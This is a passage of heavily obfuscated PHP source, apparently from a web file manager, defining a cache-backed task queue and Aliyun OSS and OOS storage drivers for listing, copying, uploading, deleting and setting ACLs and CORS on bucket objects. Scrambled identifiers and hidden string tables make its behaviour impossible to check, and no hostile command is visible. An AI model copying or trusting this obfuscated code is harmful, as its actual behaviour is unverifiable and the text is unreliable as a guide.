($ŸäÎ¤“ > 0) { $¾í™¸ƒ¥[$Şãû©ÊÂ[805]] = $¾í™¸ƒ¥[$Şãû©ÊÂ[805]] == 0 ? $ôé–¸½Š : $¾í™¸ƒ¥[$Şãû©ÊÂ[805]]; $¾í™¸ƒ¥[$Şãû©ÊÂ[1679]] = $ŸäÎ¤“; } } $this->update(); self::log("\x70\162\x6f\147\x72\145\x73\163\x48\x74\x74\x70\x3a\144\157\167\x6e\x3a{$ŸäÎ¤“}\x2f{$ôé–¸½Š}\x3b\x20\x75\x70\x6c\x6f\141\144\x3a{$°‰ãñú›}\x2f{$³¤Òç¥¿}\73"); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\x73\x6b\x51\x75\x65\165\145\114\145\x6e\x67\x74\x68"; const QUEUE_DATA = "\164\x61\x73\x6b\121\165\145\165\x65\x44\x61\x74\x61"; public static $listData = false; public static function initTask() { } public static function add($ôÊ¬§©, $×ƒ¬îæ© = array(), $ÃúÛà÷¼ = '', $ÊÀ®É¤ = '') { $ÉıŒÃÀÕ =& $_SERVER[ä¿÷‹µ±]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ÊÀ®É¤ && array_find_by_field(self::$listData, $ÉıŒÃÀÕ[94], $ÊÀ®É¤)) { return !0; } self::$listData[] = array($ÉıŒÃÀÕ[264] => $ôÊ¬§©, $ÉıŒÃÀÕ[1759] => $×ƒ¬îæ©, $ÉıŒÃÀÕ[453] => $ÃúÛà÷¼, $ÉıŒÃÀÕ[94] => $ÊÀ®É¤); return !0; } public static function addSubmit() { $Óˆ‚åû´ =& $_SERVER[ä¿÷‹µ±]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($Óˆ‚åû´[1760] . json_encode_force(array_to_keyvalue(self::$listData, $Óˆ‚åû´[12], $Óˆ‚åû´[453])), $Óˆ‚åû´[1761]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($Ì§í£É, $ŠÁ¹‡®ö = array(), $¶¿¾‹ = '', $£æéä±ì = '') { $ğˆ—Â– =& $_SERVER[ä¿÷‹µ±]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ş–à¤” = self::getAll(); if ($£æéä±ì && array_find_by_field($ş–à¤”, $ğˆ—Â–[94], $£æéä±ì)) { return !0; } $ş–à¤”[] = array($ğˆ—Â–[264] => $Ì§í£É, $ğˆ—Â–[1759] => $ŠÁ¹‡®ö, $ğˆ—Â–[453] => $¶¿¾‹, $ğˆ—Â–[94] => $£æéä±ì); write_log($ğˆ—Â–[1760] . $¶¿¾‹, $ğˆ—Â–[1761]); self::setAll($ş–à¤”); return !0; } public static function run() { $İ‹Ù“ö€ =& $_SERVER[ä¿÷‹µ±]; $¼í¦È£¸ = self::getAll(); $›ÙÃ–İÕ = array_shift($¼í¦È£¸); if (!$›ÙÃ–İÕ) { return !1; } self::setAll($¼í¦È£¸); $Âéß¯ÉÈ = timeFloat(); try { Hook::apply($›ÙÃ–İÕ[$İ‹Ù“ö€[264]], $›ÙÃ–İÕ[$İ‹Ù“ö€[1759]]); } catch (Exception $ü‘·ıÛ¸) { } $ˆ–…‚ş¥ = number_format(timeFloat() - $Âéß¯ÉÈ, 3) . $İ‹Ù“ö€[1694]; write_log($İ‹Ù“ö€[1762] . $›ÙÃ–İÕ[$İ‹Ù“ö€[453]] . $İ‹Ù“ö€[1763] . $ˆ–…‚ş¥, $İ‹Ù“ö€[1761]); return !0; } public static function count() { $èºâ¹áä = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$èºâ¹áä) { return 0; } return intval($èºâ¹áä); } public static function getAll() { $ş¶Ÿ®èÇ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$ş¶Ÿ®èÇ) { return array(); } return $ş¶Ÿ®èÇ; } public static function setAll($Ğ‰ü™) { $ì’¡Éşê = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($Ğ‰ü™), $ì’¡Éşê); Cache::set(self::QUEUE_DATA, $Ğ‰ü™, $ì’¡Éşê); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto C‘¥Şãˆ®’; BÄ“¹¿®Ö¥: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ó«¹ß ÷) { parent::__construct($ó«¹ß ÷); $this->signatureVersion($_SERVER[ä¿÷‹µ±][216]); } public function fileOutLink($ÇÒ¡İŸ•) { $ÓÙà³£ =& $_SERVER[ä¿÷‹µ±]; if (substr($ÇÒ¡İŸ•, 0, 7) == $ÓÙà³£[1347]) { $ÇÒ¡İŸ• = $ÓÙà³£[1348] . substr($ÇÒ¡İŸ•, 7); } header($ÓÙà³£[161] . $ÇÒ¡İŸ•); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($òŸö²ø) { parent::__construct(); include_once SDK_DIR . $_SERVER[ä¿÷‹µ±][1404]; $this->_init($òŸö²ø); } public function _init($íí‡‡”Ë) { $¢ŠËúÂ¹ =& $_SERVER[ä¿÷‹µ±]; foreach ($íí‡‡”Ë as $¤Šì‰§æ => $Ö¾»ÑÍš) { if (isset($this->{$¤Šì‰§æ})) { $this->{$¤Šì‰§æ} = $Ö¾»ÑÍš; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¢ŠËúÂ¹[1405] . LNG($¢ŠËúÂ¹[1406])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ÔŠì­÷ =& $_SERVER[ä¿÷‹µ±]; $Íº£ÅÕ = new OSS\Model\CorsConfig(); $•ÊÍ±Åç = new OSS\Model\CorsRule(); $•ÊÍ±Åç->addAllowedOrigin($ÔŠì­÷[1407]); $•ÊÍ±Åç->addAllowedMethod($ÔŠì­÷[1408]); $•ÊÍ±Åç->addAllowedMethod($ÔŠì­÷[1409]); $•ÊÍ±Åç->addAllowedMethod($ÔŠì­÷[1410]); $•ÊÍ±Åç->addAllowedMethod($ÔŠì­÷[1411]); $•ÊÍ±Åç->addAllowedMethod($ÔŠì­÷[160]); $•ÊÍ±Åç->setMaxAgeSeconds(600); $•ÊÍ±Åç->addExposeHeader($ÔŠì­÷[1412]); $•ÊÍ±Åç->addAllowedHeader($ÔŠì­÷[1407]); $Íº£ÅÕ->addRule($•ÊÍ±Åç); try { $this->client->putBucketCors($this->bucket, $Íº£ÅÕ); } catch (OSS\Core\OssException $ó°õ‹¥¦) { return !1; } return !0; } public function getBucketCors() { $›•èü¯« =& $_SERVER[ä¿÷‹µ±]; $Ûè—ë±Ñ = null; try { $Ûè—ë±Ñ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $¢“ßİĞ½) { return null; } if (!$Ûè—ë±Ñ || !($™âñ»û = $Ûè—ë±Ñ->getRules())) { return null; } $Ÿ¡Û÷‚Œ = $™âñ»û[0]->getAllowedOrigins(); $Ãíı¤å¥ = $™âñ»û[0]->getAllowedMethods(); $ÜĞÑé‚Ë = $™âñ»û[0]->getMaxAgeSeconds(); $÷¬Íõº© = $™âñ»û[0]->getExposeHeaders(); $±¡è«üÏ = $™âñ»û[0]->getAllowedHeaders(); return array($›•èü¯«[187] => isset($Ÿ¡Û÷‚Œ[0]) ? $Ÿ¡Û÷‚Œ[0] : $›•èü¯«[12], $›•èü¯«[191] => $Ãíı¤å¥, $›•èü¯«[1413] => $ÜĞÑé‚Ë, $›•èü¯«[1414] => isset($÷¬Íõº©[0]) ? $÷¬Íõº©[0] : $›•èü¯«[12], $›•èü¯«[189] => isset($±¡è«üÏ[0]) ? $±¡è«üÏ[0] : $›•èü¯«[12]); } public function isBucketCors() { $ÍöÁıÒñ =& $_SERVER[ä¿÷‹µ±]; $®ùñ¥îñ = $this->getBucketCors(); if (!$®ùñ¥îñ || !is_array($®ùñ¥îñ)) { return !1; } if ($®ùñ¥îñ[$ÍöÁıÒñ[187]] != $ÍöÁıÒñ[188] || $®ùñ¥îñ[$ÍöÁıÒñ[189]] != $ÍöÁıÒñ[188]) { return !1; } $îñšÎë = array_map($ÍöÁıÒñ[190], $®ùñ¥îñ[$ÍöÁıÒñ[191]]); if (!is_array($îñšÎë)) { $îñšÎë = array(); } $Œ¨Ô¸±© = array($ÍöÁıÒñ[192], $ÍöÁıÒñ[193], $ÍöÁıÒñ[194], $ÍöÁıÒñ[195], $ÍöÁıÒñ[196]); $¬áÏƒêí = array_diff($Œ¨Ô¸±©, $îñšÎë); return empty($¬áÏƒêí); } public function mkfile($Øú¿Ë§, $„­Ùæª = '', $Ø¡£º•Ò = REPEAT_RENAME) { $¶Áùö = $this->setContent($Øú¿Ë§, $„­Ùæª); if ($¶Áùö !== !1) { return $this->getPathOuter($Øú¿Ë§); } return !1; } public function mkdir($İóáéŸ³, $çÆÔòÏè = REPEAT_SKIP) { if ($çÆÔòÏè && $this->_isFolder($İóáéŸ³)) { return $this->getPathOuter($İóáéŸ³); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($İóáéŸ³)); } catch (OSS\Core\OssException $¸ËÎ­ƒ©) { return !1; } return $this->getPathOuter($İóáéŸ³); } private function fileList($°µÆŠ½³, $îÒ¹Æ— = '', $­ï©â®É = 0) { $ºô£Çƒ‰ =& $_SERVER[ä¿÷‹µ±]; $°µÆŠ½³ = trim($°µÆŠ½³, $ºô£Çƒ‰[8]); $ı«“Ù†Ì = empty($°µÆŠ½³) && $°µÆŠ½³ !== $ºô£Çƒ‰[197] ? $ºô£Çƒ‰[12] : $°µÆŠ½³ . $ºô£Çƒ‰[8]; $…¼ÎïÖÜ = $ºô£Çƒ‰[12]; $¼³Ú¿ù¬ = 1000; $Ì•´¯Œ = $©‰×£· = array(); while (!0) { check_abort(); $­Æ…ÖÛ½ = array($ºô£Çƒ‰[1415] => $îÒ¹Æ—, $ºô£Çƒ‰[1416] => $ı«“Ù†Ì, $ºô£Çƒ‰[1417] => $¼³Ú¿ù¬, $ºô£Çƒ‰[1418] => $…¼ÎïÖÜ); try { $ŠÑ¨ÏÌ— = $this->client->listObjects($this->bucket, $­Æ…ÖÛ½); } catch (OSS\Core\OssException $üŠŞ†Ş) { break; } $…¼ÎïÖÜ = $ŠÑ¨ÏÌ—->getNextMarker(); $¬–ñ’Ô = $ŠÑ¨ÏÌ—->getObjectList(); $†²³ø = $ŠÑ¨ÏÌ—->getPrefixList(); foreach ($¬–ñ’Ô as $«üşÁ–İ) { if ($«üşÁ–İ->getKey() == $ı«“Ù†Ì) { continue; } $‘ØŸ¸¾ß = $«üşÁ–İ->getKey(); $‡¼àøûë = $«üşÁ–İ->getSize(); $—òÎÕ­ = $«üşÁ–İ->getLastModified(); $®ı´ıùõ = $­ï©â®É ? array($ºô£Çƒ‰[32] => $‘ØŸ¸¾ß, $ºô£Çƒ‰[76] => $‡¼àøûë, $ºô£Çƒ‰[203] => strtotime($—òÎÕ­)) : $‘ØŸ¸¾ß; $Ãç¨í¤ = $‡¼àøûë == 0 && substr($‘ØŸ¸¾ß, strlen($‘ØŸ¸¾ß) - 1, 1) == $ºô£Çƒ‰[8] ? !0 : !1; $ïîÔÕóÊ = array($ºô£Çƒ‰[76] => $‡¼àøûë, $ºô£Çƒ‰[1419] => $‡¼àøûë, $ºô£Çƒ‰[85] => strtotime($—òÎÕ­), $ºô£Çƒ‰[1420] => $—òÎÕ­); $this->cacheMethodInfoSet($‘ØŸ¸¾ß, $Ãç¨í¤, $ïîÔÕóÊ); if ($Ãç¨í¤) { $Ì•´¯Œ[] = $‘ØŸ¸¾ß; continue; } $©‰×£·[] = $®ı´ıùõ; } foreach ($†²³ø as $Ä¶ÉÙ«ì) { $Ì•´¯Œ[] = $Ä¶ÉÙ«ì->getPrefix(); $this->cacheMethodInfoSet($Ä¶ÉÙ«ì->getPrefix(), !0); } if ($…¼ÎïÖÜ === $ºô£Çƒ‰[12]) { break; } } $this->cacheMethodInfoSet($°µÆŠ½³, !0); return array($ºô£Çƒ‰[82] => $Ì•´¯Œ, $ºô£Çƒ‰[83] => $©‰×£·); } public function copyFile($À“Öü«É, $üÊ°Åè¨) { $‘×Œ‡Ñò = $this->size($À“Öü«É); if ($‘×Œ‡Ñò < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $À“Öü«É, $this->bucket, $this->pathEncode($üÊ°Åè¨)); } catch (OSS\Core\OssException $ûÁœÑ•Ë) { return !1; } return $this->getPathOuter($üÊ°Åè¨); } $ÌµÀ¦«š = $this->multiCopyObject($À“Öü«É, $üÊ°Åè¨, $‘×Œ‡Ñò); return $ÌµÀ¦«š ? $this->getPathOuter($üÊ°Åè¨) : !1; } private function multiCopyObject($Ôùİğúé, $ÀáÑÍõ€, $Ûíë¥»ä) { $—¦¯€ =& $_SERVER[ä¿÷‹µ±]; try { $§½×šÖÊ = array(); if ($ˆŸÒåÖ® = $this->hashMd5($Ôùİğúé)) { $§½×šÖÊ = array(OSS\OssClient::OSS_HEADERS => array($—¦¯€[1421] => $ˆŸÒåÖ®)); } $È–å¥ÍŠ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ÀáÑÍõ€), $§½×šÖÊ); $Õ¡Âä½ß = 1; $¦ûˆÖÆ = 0; $Ä‘óõ‘ = array(); $ó‘ÃÌŞ¶ = 1024 * 1024 * 10; $ê¿…‚¶Ÿ = $this->client->generateMultiuploadParts($Ûíë¥»ä, $ó‘ÃÌŞ¶); foreach ($ê¿…‚¶Ÿ as $¼µó¼ÊÈ => $¢“¼è§) { $”‘íÒ” = $¦ûˆÖÆ + (int) $¢“¼è§[$—¦¯€[1422]]; $ì¡ñÛî = (int) $¢“¼è§[$—¦¯€[337]] + $”‘íÒ” - 1; $â°´ÍëÅ = array($—¦¯€[1423] => $”‘íÒ”, $—¦¯€[1424] => $ì¡ñÛî); $Ä‘óõ‘[] = $this->client->uploadPartCopy($this->bucket, $Ôùİğúé, $this->bucket, $this->pathEncode($ÀáÑÍõ€), $Õ¡Âä½ß, $È–å¥ÍŠ, $â°´ÍëÅ); $Õ¡Âä½ß = $Õ¡Âä½ß + 1; } $ƒº»ŸüÁ = array(); foreach ($Ä‘óõ‘ as $¼µó¼ÊÈ => $ÃÓÉ‘öš) { $ƒº»ŸüÁ[] = array($—¦¯€[1425] => $¼µó¼ÊÈ + 1, $—¦¯€[1426] => $ÃÓÉ‘öš); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ÀáÑÍõ€), $È–å¥ÍŠ, $ƒº»ŸüÁ); } catch (OSS\Core\OssException $†Ö‘Û”Å) { return !1; } return !0; } public function moveFile($‰ƒ¦¼Í€, $ÀˆŒâŒÏ) { if ($this->copyFile($‰ƒ¦¼Í€, $ÀˆŒâŒÏ)) { $this->remove($‰ƒ¦¼Í€); return $this->getPathOuter($ÀˆŒâŒÏ); } return !1; } public function delFile($Êåúİ“®) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Êåúİ“®)); } catch (OSS\Core\OssException $®ÕÙã·) { return !1; } return !0; } public function delFolder($Ü°è©®Ò) { $Ì¡Œß–³ =& $_SERVER[ä¿÷‹µ±]; if (!$this->exist($Ü°è©®Ò)) { return !0; } $this->listItemCache = !1; $œÕé¯¢Û = $this->fileList($Ü°è©®Ò); $this->listItemCache = !0; $Ü‚šéé¡ = trim($Ü°è©®Ò, $Ì¡Œß–³[8]) . $Ì¡Œß–³[8]; if (!empty($Ü°è©®Ò) && $Ü°è©®Ò !== $Ì¡Œß–³[197] && !in_array($Ü‚šéé¡, $œÕé¯¢Û[$Ì¡Œß–³[82]])) { $œÕé¯¢Û[$Ì¡Œß–³[82]][] = $Ü‚šéé¡; } $ü¾å‘”Á = $this->delByBatch($œÕé¯¢Û[$Ì¡Œß–³[83]]); if (!$ü¾å‘”Á) { return !1; } $ü¾å‘”Á = $this->delByBatch($œÕé¯¢Û[$Ì¡Œß–³[82]]); if (!$ü¾å‘”Á) { return !1; } return $this->delFile($Ü‚šéé¡); } private function delByBatch($ñá¼šúĞ) { foreach (array_chunk($ñá¼šúĞ, 1000) as $Ò×Áã·ı) { try { $this->client->deleteObjects($this->bucket, $Ò×Áã·ı); } catch (OSS\Core\OssException $¤‹Âã´ã) { return !1; } } return !0; } public function rename($Ÿèı¤Ç, $”¼¢ƒ‰è) { return $this->renameObject($Ÿèı¤Ç, $”¼¢ƒ‰è); } private function fileInfo($–´ìÒ®õ, $Ü‹Ôù„ = false, $‡˜å…ª¸ = array()) { $¸šü‹€ =& $_SERVER[ä¿÷‹µ±]; $õ¾’Íæ = array($¸šü‹€[32] => $this->pathThis($–´ìÒ®õ), $¸šü‹€[84] => $this->getPathOuter($–´ìÒ®õ), $¸šü‹€[33] => $¸šü‹€[199], $¸šü‹€[76] => isset($‡˜å…ª¸[$¸šü‹€[76]]) ? $‡˜å…ª¸[$¸šü‹€[76]] : 0, $¸šü‹€[174] => $this->ext($–´ìÒ®õ)); if ($Ü‹Ôù„) { return $õ¾’Íæ; } $õ¾’Íæ[$¸šü‹€[200]] = $õ¾’Íæ[$¸šü‹€[85]] = 0; $õ¾’Íæ[$¸šü‹€[201]] = $õ¾’Íæ[$¸šü‹€[202]] = !0; if (empty($‡˜å…ª¸)) { $ÑÑàóÈ = $this->objectMeta($–´ìÒ®õ); if (!$ÑÑàóÈ) { return $õ¾’Íæ; } $‡˜å…ª¸ = array($¸šü‹€[85] => strtotime($ÑÑàóÈ[$¸šü‹€[1420]]), $¸šü‹€[76] => $ÑÑàóÈ[$¸šü‹€[1419]] + 0); } if (isset($‡˜å…ª¸[$¸šü‹€[76]])) { $õ¾’Íæ[$¸šü‹€[76]] = $‡˜å…ª¸[$¸šü‹€[76]]; } if (isset($‡˜å…ª¸[$¸šü‹€[85]])) { $õ¾’Íæ[$¸šü‹€[85]] = $‡˜å…ª¸[$¸šü‹€[85]]; } if (isset($‡˜å…ª¸[$¸šü‹€[203]]) && !trim($õ¾’Íæ[$¸šü‹€[85]])) { $õ¾’Íæ[$¸šü‹€[85]] = $‡˜å…ª¸[$¸šü‹€[203]]; } return $õ¾’Íæ; } private function folderInfo($óşÅ½, $ü“º‡Ç³ = false, $¢ÕßøÓ = array()) { $‡âëÇ€é =& $_SERVER[ä¿÷‹µ±]; $‰¾–Æ£ü = array($‡âëÇ€é[32] => $this->pathThis($óşÅ½), $‡âëÇ€é[84] => $this->getPathOuter($‡âëÇ€é[8] . $óşÅ½), $‡âëÇ€é[33] => $‡âëÇ€é[75]); if ($ü“º‡Ç³) { return $‰¾–Æ£ü; } $‰¾–Æ£ü[$‡âëÇ€é[200]] = $‰¾–Æ£ü[$‡âëÇ€é[85]] = 0; $‰¾–Æ£ü[$‡âëÇ€é[201]] = $‰¾–Æ£ü[$‡âëÇ€é[202]] = !0; if (empty($¢ÕßøÓ)) { $óşÅ½ = rtrim($óşÅ½, $‡âëÇ€é[8]) . $‡âëÇ€é[8]; $ÑÇíºãÙ = $this->objectMeta($óşÅ½); if (!$ÑÇíºãÙ) { return $‰¾–Æ£ü; } $¢ÕßøÓ = array($‡âëÇ€é[200] => $ÑÇíºãÙ[$‡âëÇ€é[511]][$‡âëÇ€é[1427]], $‡âëÇ€é[85] => strtotime($ÑÇíºãÙ[$‡âëÇ€é[1420]])); } if (isset($¢ÕßøÓ[$‡âëÇ€é[85]])) { $‰¾–Æ£ü[$‡âëÇ€é[85]] = $¢ÕßøÓ[$‡âëÇ€é[85]]; } if (isset($¢ÕßøÓ[$‡âëÇ€é[200]])) { $‰¾–Æ£ü[$‡âëÇ€é[200]] = $¢ÕßøÓ[$‡âëÇ€é[200]]; } return $‰¾–Æ£ü; } public function listPath($àãø´¬, $´§”æÕ¤ = false) { $Ÿêâ©œ™ =& $_SERVER[ä¿÷‹µ±]; $°éàÙò¬ = $this->fileList($àãø´¬, $Ÿêâ©œ™[8], !0); foreach ($°éàÙò¬[$Ÿêâ©œ™[82]] as $Ê¨¸·í => $ïµÈı€) { $°éàÙò¬[$Ÿêâ©œ™[82]][$Ê¨¸·í] = $this->folderInfo($ïµÈı€, $´§”æÕ¤, $ïµÈı€); } foreach ($°éàÙò¬[$Ÿêâ©œ™[83]] as $Ê¨¸·í => $ïµÈı€) { $°éàÙò¬[$Ÿêâ©œ™[83]][$Ê¨¸·í] = $this->fileInfo($ïµÈı€[$Ÿêâ©œ™[32]], $´§”æÕ¤, $ïµÈı€); } return $°éàÙò¬; } protected function infoChildren($Š¥»â×, &$§›ÈÉ›Ñ) { $Œ’¶›Ëº =& $_SERVER[ä¿÷‹µ±]; $×ôü°ˆ = $this->fileList($Š¥»â×, $Œ’¶›Ëº[12], !0); $§›ÈÉ›Ñ[$Œ’¶›Ëº[78]] += count($×ôü°ˆ[$Œ’¶›Ëº[82]]); $§›ÈÉ›Ñ[$Œ’¶›Ëº[77]] += count($×ôü°ˆ[$Œ’¶›Ëº[83]]); foreach ($×ôü°ˆ[$Œ’¶›Ëº[83]] as $³ôŠı¬ú) { if (!$³ôŠı¬ú || !$³ôŠı¬ú[$Œ’¶›Ëº[76]]) { continue; } $§›ÈÉ›Ñ[$Œ’¶›Ëº[76]] += $³ôŠı¬ú[$Œ’¶›Ëº[76]]; } } public function has($¥·ûÜ—û, $˜š–Çúã = false, $®”¢§ = true) { $”Şàª€ =& $_SERVER[ä¿÷‹µ±]; $¥·ûÜ—û = trim($¥·ûÜ—û, $”Şàª€[8]); $‰­ôĞµ = empty($¥·ûÜ—û) && $¥·ûÜ—û !== $”Şàª€[197] ? $”Şàª€[12] : $¥·ûÜ—û . $”Şàª€[8]; $óÖ†‡’Ù = $”Şàª€[12]; $¼¹õöÜá = 500; $Ñ¨†ùÉ‚ = $ò¿ä‡±´ = 0; while (!0) { check_abort(); $ Îíéò¾ = array($”Şàª€[1415] => $”Şàª€[8], $”Şàª€[1416] => $‰­ôĞµ, $”Şàª€[1417] => $¼¹õöÜá, $”Şàª€[1418] => $óÖ†‡’Ù); try { $±ï¯†°É = $this->client->listObjects($this->bucket, $ Îíéò¾); } catch (OSS\Core\OssException $ûüË‡İ) { break; } $óÖ†‡’Ù = $±ï¯†°É->getNextMarker(); $ş«è©±ú = $±ï¯†°É->getObjectList(); $Ü…£ÓÇø = $±ï¯†°É->getPrefixList(); if ($˜š–Çúã) { if (count($ş«è©±ú) > 1 || count($ş«è©±ú) == 1 && $ş«è©±ú[0]->getKey() != $‰­ôĞµ) { $Ñ¨†ùÉ‚ += count($ş«è©±ú) - 1; } if (!empty($Ü…£ÓÇø)) { $ò¿ä‡±´ += count($Ü…£ÓÇø); } if ($óÖ†‡’Ù === $”Şàª€[12]) { break; } continue; } if ($®”¢§) { if (!empty($ş«è©±ú)) { if (count($ş«è©±ú) > 1 || $ş«è©±ú[0]->getKey() != $‰­ôĞµ) { return !0; } } } else { if (!empty($Ü…£ÓÇø)) { return !0; } } if ($óÖ†‡’Ù === $”Şàª€[12]) { break; } } if ($˜š–Çúã) { return array($”Şàª€[207] => $Ñ¨†ùÉ‚, $”Şàª€[208] => $ò¿ä‡±´); } return !1; } public function listAll($˜Ğ†ıƒŠ) { $ÆôÏ…È¼ =& $_SERVER[ä¿÷‹µ±]; $¥°¦í» = $this->fileList($˜Ğ†ıƒŠ, $ÆôÏ…È¼[12], !0); $ÅçÑë¨— = array(); foreach ($¥°¦í»[$ÆôÏ…È¼[83]] as $«Í°š¾ü) { $ÅçÑë¨—[$«Í°š¾ü[$ÆôÏ…È¼[32]]] = $«Í°š¾ü[$ÆôÏ…È¼[76]]; } foreach ($¥°¦í»[$ÆôÏ…È¼[82]] as $«Í°š¾ü) { if (is_string($«Í°š¾ü)) { $ÅçÑë¨—[$«Í°š¾ü] = 0; } } return $this->listAllFiles($˜Ğ†ıƒŠ, array_keys($ÅçÑë¨—), $ÅçÑë¨—); } public function canRead($û²Ôâ´) { $­ŠĞ‘½â =& $_SERVER[ä¿÷‹µ±]; $§ã½ü¯Ç = $this->pathAcl($û²Ôâ´); return $§ã½ü¯Ç == $­ŠĞ‘½â[1428] || $§ã½ü¯Ç == $­ŠĞ‘½â[556] ? !0 : !1; } public function canWrite($Õšø€·ø) { $ü‹õèÓÕ = $this->pathAcl($Õšø€·ø); return $ü‹õèÓÕ == $_SERVER[ä¿÷‹µ±][556] ? !0 : !1; } public function pathAcl($¡×Ô”®“) { $•Íùæˆ =& $_SERVER[ä¿÷‹µ±]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ôÖŸ¶„ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¡×Ô”®“)); } catch (OSS\Core\OssException $„Ãï²“Ó) { return !1; } $î‚š‹êÚ = $ôÖŸ¶„ == $•Íùæˆ[37] ? $this->bucketAcl : $ôÖŸ¶„; if ($î‚š‹êÚ == $•Íùæˆ[1429]) { return $•Íùæˆ[1428]; } if ($î‚š‹êÚ == $•Íùæˆ[1430]) { return $•Íùæˆ[556]; } return $î‚š‹êÚ; } private function chmodPath($½¬ÂöÄ», $‡óöò¼³ = '') { $–½ë¸ =& $_SERVER[ä¿÷‹µ±]; $¬€èÓØğ = empty($‡óöò¼³) ? $–½ë¸[1430] : $‡óöò¼³; $â»Íâı• = array($–½ë¸[37], $–½ë¸[198], $–½ë¸[1429], $–½ë¸[1430]); if (!in_array($¬€èÓØğ, $â»Íâı•)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($½¬ÂöÄ»), $¬€èÓØğ); } catch (OSS\Core\OssException $øŸç‹ó) { return !1; } return !0; } public function getContent($öû†èº) { return $this->fileSubstr($öû†èº, -1); } public function setContent($¢ßú¶€İ, $Ë€ó¹Ã½ = '') { $ÉŒà™¬Ø =& $_SERVER[ä¿÷‹µ±]; try { $ïÂÈˆÙÎ = $this->trafficLimit($ÉŒà™¬Ø[1431]); $¡ÚîÁ€Æ = $this->client->putObject($this->bucket, $this->pathEncode($¢ßú¶€İ), $Ë€ó¹Ã½, $ïÂÈˆÙÎ); } catch (OSS\Core\OssException $‹Ô–¡å) { return !1; } $ÓÆ Ê‘ = array($ÉŒà™¬Ø[1421] => trim($¡ÚîÁ€Æ[$ÉŒà™¬Ø[1432]], $ÉŒà™¬Ø[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¢ßú¶€İ))); $this->updateObjMeta($¢ßú¶€İ, $ÓÆ Ê‘); return isset($¡ÚîÁ€Æ[$ÉŒà™¬Ø[1433]][$ÉŒà™¬Ø[1380]]) ? !0 : !1; } private function updateObjMeta($…Â”ÆÔ, $‰Ñ‚ù¡) { $…Â”ÆÔ = $this->pathEncode($…Â”ÆÔ); try { $½ìâáñÅ = array(OSS\OssClient::OSS_HEADERS => $‰Ñ‚ù¡); $this->client->copyObject($this->bucket, $…Â”ÆÔ, $this->bucket, $…Â”ÆÔ, $½ìâáñÅ); } catch (OSS\Core\OssException $Íöäú³) { return !1; } return !0; } public function upload($€— šÑÁ, $± ³— ç, $É£äşÚ÷ = false, $·Ÿ•»û = REPEAT_REPLACE) { $©ùŠó† =& $_SERVER[ä¿÷‹µ±]; $ÔÙöç¢ = trim($€— šÑÁ, $©ùŠó†[8]); $†€Ù×Óˆ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($©ùŠó†[1421] => @md5_file($± ³— ç)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($€— šÑÁ))); $†€Ù×Óˆ = $this->trafficLimit($©ùŠó†[1431], $†€Ù×Óˆ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ÔÙöç¢), $± ³— ç, $†€Ù×Óˆ); } catch (OSS\Core\OssException $ªİ¡•¥Ú) { return !1; } return $this->getPathOuter($€— šÑÁ); } public function getHost() { $óì¹¬Â» =& $_SERVER[ä¿÷‹µ±]; $¤ÅÌàÖë = explode($óì¹¬Â»[183], parent::getHost()); return $¤ÅÌàÖë[0] . $óì¹¬Â»[183] . $this->bucket . $óì¹¬Â»[10] . $¤ÅÌàÖë[1]; } public function uploadFormData($¡óˆ’, $áßĞĞÀ° = 3600) { $‡ÁŒ‡ =& $_SERVER[ä¿÷‹µ±]; if (!($–¸ŒÙ˜€ = $this->getHost())) { return !1; } $š™ó…Äõ = $áßĞĞÀ°; $øÙ­ôŸå = date($‡ÁŒ‡[1434], time() + $š™ó…Äõ); $¨Íâûºã = new DateTime($øÙ­ôŸå); $Øé¯â›¢ = $¨Íâûºã->format(DateTime::ISO8601); $ÅÛ­•ìö = strpos($Øé¯â›¢, $‡ÁŒ‡[296]); $Øé¯â›¢ = substr($Øé¯â›¢, 0, $ÅÛ­•ìö) . $‡ÁŒ‡[1435]; $Ø”Ø×Ú† = 1048576000 * 5; $Œ‚òÔ = $this->pathFather($¡óˆ’); $Ï€”¹Éî = array($‡ÁŒ‡[1334] => $Øé¯â›¢, $‡ÁŒ‡[1335] => array(array($‡ÁŒ‡[1436], 0, $Ø”Ø×Ú†), array($‡ÁŒ‡[1338], $‡ÁŒ‡[1339], $Œ‚òÔ))); $ÌÓÓÊÔŠ = base64_encode(json_encode($Ï€”¹Éî)); $ø˜ äı = base64_encode(hash_hmac($‡ÁŒ‡[232], $ÌÓÓÊÔŠ, $this->secret, !0)); $ûæ¬šƒã = array($‡ÁŒ‡[1344] => 